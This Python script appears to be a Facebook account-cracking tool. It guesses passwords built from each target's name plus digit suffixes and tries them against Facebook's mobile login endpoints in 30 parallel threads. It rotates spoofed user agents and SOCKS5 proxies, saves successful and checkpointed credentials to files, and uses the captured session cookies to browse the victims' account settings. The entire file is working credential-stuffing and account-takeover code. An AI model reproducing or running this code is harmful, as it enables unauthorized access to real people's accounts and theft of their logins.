
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json, threading,platform,string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from time import sleep
ses = requests.Session()
device = platform.platform()

from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

from src import login as Login
from src import dump as Dump
from src import lain as Lain

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

ses = requests.Session()
loop = 0
id,id2,ok,cp = [],[],[],[]
mtd_dev = []
pwx = []
ugen = []
redmi = []
nokia = []
ugen2 =[]
apk = []
azxc = []
pwd_time = int(datetime.now().timestamp())

now = datetime.now()
day = now.day
month = now.month
year = now.year
month_birthday = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
month_cek = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if month < 0 or month > 12:
		exit()
	month_now = month - 1
except ValueError:exit()
_month_ = month_cek[month_now]
my_date = date.today()
day_now = calendar.day_name[my_date.weekday()]
date_now = ("%s-%s-%s-%s"%(day_now,day,_month_,year))


for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android;'
	b=random.choice(['9','10','11','12','13'])
	c=random.choice(['zh-cn; RMX2121 Build/SP1A.210812.016)','en-US; RMX2001 Build/QP1A.190711.020)','in-id; RMX2001 Build/QP1A.190711.020)','en-US; RMX3081 Build/RKQ1.201112.002)','pl-pl; RMX3081 Build/RKQ1.201112.002)','th-th; RMX3521 Build/RKQ1.211119.001)','RMX3081 Build/RKQ1.201112.002; wv)','RMX3081 Build/SKQ1.210216.001; wv)','RMX2001 Build/QP1A.190711.020; wv)','RMX2001 Build/RP1A.200720.011; wv)','RMX2155 Build/SP1A.210812.016; wv)','RMX2151 Build/QP1A.190711.020; wv)','RMX2151 Build/RP1A.200720.011; wv)','RMX3085 Build/SP1A.210812.016; wv)','RMX3085 Build/RP1A.200720.011; wv)','RMX3521 Build/RKQ1.211119.001; wv)','RMX2061 Build/RKQ1.201112.002; wv)','RMX2063 Build/RKQ1.201112.002; wv)','vi; RMX2061 Build/RKQ1.201112.002)','th-TH; RMX2061 Build/RKQ1.201112.002)','RMX2202 Build/RKQ1.211119.001; wv)','th-th; RMX2202 Build/RKQ1.201105.002)','th-th; RMX2202 Build/SKQ1.210216.001)','zh-CN; RMX2202 Build/RKQ1.211119.001)','th-th; RMX2086 Build/RKQ1.200928.002)','RMX2086 Build/RKQ1.200928.002; wv)'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(50,104)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	x=random.choice(['UCBrowser/13.3.8.1305','XiaoMi/MiuiBrowser/13.11.1-gn','HeyTapBrowser/40.8.2.2'])
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c} {g}{h}.{i}.{j}.{k} {x} {l}'
	ugen.append(uaku2)

try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"

def setting_password(id):
	print("")
	prints(Panel(f"""{P2}succes collecting {len(id)} id""",width=80,padding=(0,23),style=f"{color_table}"))
	set = input(f" {N}do you want to use manual password?[y/n] : ")
	if set in["y","Y"]:
		manual(id)
	else:
		otomatis(id)
	
def aturutuan(id):
	urut = []
	urut.append(Panel(f"{P2}[{color_rich}01{P2}]. id old to new",width=24,style=f"{color_table}"))
	urut.append(Panel(f"{P2}[{color_rich}02{P2}]. id new to old",width=24,style=f"{color_table}"))
	urut.append(Panel(f"{P2}[{color_rich}03{P2}]. id random",width=25,style=f"{color_table}"))
	console.print(Columns(urut))
	ask = input(f" {N}choose your choice : ")
	if ask in["1"]:
		for urutan in sorted(id):
			id2.append(urutan)
	elif ask in["2"]:
		mud = []
		for z in sorted(id):
			mud.append(z)
		az=len(mud)
		ax=(az-1)
		for c in range(az):
			id2.append(mud[ax])
			ax -=1
	elif ask in["3"]:
		for urutan in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,urutan)

def manual(id):
	prints(Panel(f"""{P2}create a many password using a comma (,) as a separator""",width=80,style=f"{color_table}"))
	pwx = input(f" {N}create password : ")
	if len(pwx)<=5:
		prints(Panel(f"""{P2}please create a password with at least 6 letters or more""",width=80,style=f"{color_table}"))
		sys.exit()
	aturutuan(id)
	prints(Panel(f"""{P2}if it appears will make the crack process slower, recommended select n""",width=80,style=f"{color_table}"))
	apli = input(f" {N}do you want to show applications when crack?[y/n] : ")
	if apli in["Y","y"]:
		apk.append("show")
	else:
		pass
	azxc.append(Panel(f"""{P2}[{color_rich}01{P2}]. metode freefb
[{color_rich}02{P2}]. metode mbasic
[{color_rich}03{P2}]. metode mobile""",width=37,title=f"{P2}metode reguler",style=f"{color_table}"))
	azxc.append(Panel(f"""{P2}[{color_rich}04{P2}]. metode freefb
[{color_rich}05{P2}]. metode mbasic
[{color_rich}06{P2}]. metode mobile""",width=37,title=f"{P2}metode validate",style=f"{color_table}"))
	console.print(Columns(azxc))
	log = input(f" {N}choose your url login : ")
	if log in["1","01"]:
		mtd_dev.append("free")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["2","02"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["3","03"]:
		mtd_dev.append("mobile")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["4","04"]:
		mtd_dev.append("free")
		setting_proxy()
		manual_validate(pwx)
	elif log in["5","05"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		manual_validate(pwx)
	elif log in["6","06"]:
		mtd_dev.append("mobile")
		setting_proxy()
		manual_validate(pwx)

def otomatis(id):
	aturutuan(id)
	prints(Panel(f"""{P2}if it appears will make the crack process slower, recommended select n""",width=80,style=f"{color_table}"))
	apli = input(f" {N}do you want to show applications when crack?[y/n] : ")
	if apli in["Y","y"]:
		apk.append("show")
	else:
		pass
	azxc.append(Panel(f"""{P2}[{color_rich}01{P2}]. metode freefb
[{color_rich}02{P2}]. metode mbasic
[{color_rich}03{P2}]. metode mobile""",width=37,title=f"{P2}metode reguler",style=f"{color_table}"))
	azxc.append(Panel(f"""{P2}[{color_rich}04{P2}]. metode freefb
[{color_rich}05{P2}]. metode mbasic
[{color_rich}06{P2}]. metode mobile""",width=37,title=f"{P2}metode validate",style=f"{color_table}"))
	console.print(Columns(azxc))
	log = input(f" {N}choose your url login : ")
	if log in["1","01"]:
		mtd_dev.append("free")
		setting_proxy()
		otomatis_reguler()
	elif log in["2","02"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		otomatis_reguler()
	elif log in["3","03"]:
		mtd_dev.append("mobile")
		setting_proxy()
		otomatis_reguler()
	elif log in["4","04"]:
		mtd_dev.append("free")
		setting_proxy()
		otomatis_validate()
	elif log in["5","05"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		otomatis_validate()
	elif log in["6","06"]:
		mtd_dev.append("mobile")
		setting_proxy()
		otomatis_validate()
	
def setting_proxy():
	prints(Panel(f"""{P2}if you choose n it will use the previous proxy that already exists""",width=80,style=f"{color_table}"))
	pr = input(f" {N}do you want to use the latest proxy?[y/n] : ")
	if pr in["y","Y"]:
		try:
		 os.system('rm -rf data/proxy.txt')
		 url = ses.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
		 open("data/proxy.txt","w").write(url)
		except:pass
	else:
		pass

def manual_reguler(pwz):
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid  = user.split("<=>")[0]
					name = user.split("<=>")[1]
					for z in pwz.split(","):
						pwx.append(z)
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
	
def manual_validate(pwz):
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid  = user.split("<=>")[0]
					name = user.split("<=>")[1]
					for z in pwz.split(","):
						pwx.append(z)
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()

def otomatis_reguler():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = ['1122334455','1234554321','112233445566','123456654321']
					uid,nama = user.split('<=>')[0],user.split('<=>')[1].lower()
					depan = nama.split(" ")[0]
					if len(nama)<=5:
						if len(depan)<3:
							pass 
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"1234")
							pwx.append(depan+"12345")
							pwx.append(depan+"123456")
					else:
						if len(depan)<3:
							pwx.append(nama)
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"1234")
							pwx.append(depan+"12345")
							pwx.append(depan+"123456")
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"free.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
	
def otomatis_validate():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid,nama = user.split('<=>')[0],user.split('<=>')[1].lower()
					depan = nama.split(" ")[0]
					if len(nama)<=5:
						if len(depan)<3:
							pass 
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"1234")
							pwx.append(depan+"12345")
							pwx.append(depan+"123456")
					else:
						if len(depan)<3:
							pwx.append(nama)
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"1234")
							pwx.append(depan+"12345")
							pwx.append(depan+"123456")
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
    
def metode_reguler(user, pwx, url):
	global ok,cp,loop
	redmi = open('data/fb1_000003.txt','r').read().splitlines()
	ua = random.choice(redmi)
	nokia = open('data/ugent.txt','r').read().splitlines()
	ua2 = random.choice(nokia)
	prox = open("data/proxy.txt","r").read().splitlines()
	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
	prog.advance(des)
	for pw in pwx:
		try:
			pw = pw.lower()
			ses=requests.Session()
			proxy= {"http": "socks5://{random.choice(prox)}"}
			headers1= {
				"Host":url,
				"upgrade-insecure-requests":"1",
				"user-agent":'Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0',
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				"referer":f"https://{url}/",
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
				}
			p = ses.get(f"https://{url}/login/?next&ref=dbl&fl&refid=8",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"email":user,
				"pass":pw
				}
			#cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			#cookie += " m_pixel_ratio=2.625; wd=412x756"
			headers2 = {
				"Host": url,
				"cache-control":"max-age=0",
				"upgrade-insecure-requests":"1",
				"origin":f"https://{url}",
				"content-type":"application/x-www-form-urlencoded",
				"user-agent":'Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0',
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				'referer':f'https://{url}/login/?next&ref=dbl&fl&refid=8',
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
				}
			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data, headers=headers2, proxies=proxy)
			if "c_user" in ses.cookies.get_dict():
				ok.append(user)
				coki = convert(ses.cookies.get_dict())
				user = re.findall('c_user=(.*);xs', coki)[0]
				if "show" in apk:
					get_apk(user,pw,coki)
				else:
					tree = Tree("                                 ")
					tree.add(f"\r{H}{user}|{pw}{P} ")
					tree.add(f"{H}{ua}{N}")
					prints(tree)
				open("OK/%s.txt"%(date_now),"a").write(" %s|%s|%s\n"%(user, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp.append(user)
				tree = Tree("                                 ")
				tree.add(f"\r{K}{user}|{pw}{P} ")
				tree.add(f"{K}{ua}{N}")
				prints(tree)
				open("CP/%s.txt"%(date_now),"a").write(" %s|%s\n"%(user, pw))
				break
		except requests.exceptions.ConnectionError:
			sleep(32)

	loop+=1
	
def metode_validate(user, pwx, url):
	global ok,cp,loop
	redmi = open('data/fb1_000008.txt','r').read().splitlines()
	ua = random.choice(redmi)
	nokia = open('data/nokia1.txt','r').read().splitlines()
	ua2 = random.choice(nokia)
	prox = open("data/proxy.txt","r").read().splitlines()
	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
	prog.advance(des)
	for pw in pwx:
		try:
			pw = pw.lower()
			ses = requests.Session()
			proxy= {"http": "socks5://{random.choice(prox)}"}
			url = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8")
			headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer'": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"email":user,"pass": pw}
			post = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100", data=data, headers=headers, proxies=proxy)
			if "c_user" in ses.cookies.get_dict():
				ok.append(user)
				coki = convert(ses.cookies.get_dict())
				user = re.findall('c_user=(.*);xs', coki)[0]
				if "show" in apk:
					get_apk(user,pw,coki)
				else:
					tree = Tree("                                 ")
					tree.add(f"\r{H}{user}|{pw}{P} ")
					tree.add(f"{H}{ua}{N}")
					prints(tree)
				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user| pw))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp.append(user)
				tree = Tree("                                 ")
				tree.add(f"\r{K}{user}|{pw}{P} ")
				prints(tree)
				open("CP/%s.txt"%(date_now),"a").write("  * --> %s|%s\n"%(user, pw))
				break
		except requests.exceptions.ConnectionError:
			sleep(32)
	loop+=1
		
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

def get_apk(user,pw,cok):
	cookie = {"cookie":cok}
	language(cookie)
	tree = Tree("                                 ")
	tree.add(f"\r{H}{user}|{pw}{N} ")
	tree.add(f"\r{H}{ua}{N}")
	try:
		active = Tree(f"\r{N}active application :")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,active,cookie)
	except Exception as e:
		print(e)
	try:
		inactive = Tree(f"\r{N}inactive application :")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,inactive,cookie)
	except Exception as e:
		print(e)
	tree.add(active)
	tree.add(inactive)
	prints(tree)
		
def get_active(url,active,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Ditambahkan" in apk.text:
				active.add(f"\r{H}{str(apk.text).replace('Ditambahkan',' Ditambahkan')}{N}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_active(next,active,cookie)
	except:pass

def get_inactive(url,inactive,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Kedaluwarsa" in apk.text:
				inactive.add(f"\r{M}{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}{N}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_inactive(next,inactive,cookie)
	except:pass

def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
	
def saveresulst():
	prints(Panel(f"""\r{P2}results acoount ok saved to : {date_now}
results acoount cp saved to : {date_now}""",width=80,padding=(0,10),style=f"{color_table}"))

